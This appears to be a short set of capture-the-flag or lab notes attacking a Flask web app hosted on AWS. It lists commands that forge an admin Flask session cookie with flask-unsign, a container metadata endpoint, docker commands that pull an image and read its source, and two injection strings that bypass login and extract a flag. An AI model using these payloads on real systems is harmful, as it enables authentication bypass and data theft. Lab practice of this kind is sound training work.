python3 -m venv lab
pip3 install flask-unsign
flask-unsign --decode --cookie  guest-cookie

flask-unsign --sign --cookie "{'admin': True, 'user': 'admin'}" --secret "app secret"


http://169.254.170.2/v2/metadata

docker pull public.ecr.aws/x2q4d0z7/cloudnine-app:latest

docker history --no-trunc public.ecr.aws/x2q4d0z7/cloudnine-app:latest

docker run --rm public.ecr.aws/x2q4d0z7/cloudnine-app:latest cat /app/app.py

admin' OR '1'='1 
guest' OR begins_with("password", 'THM{') OR username = '
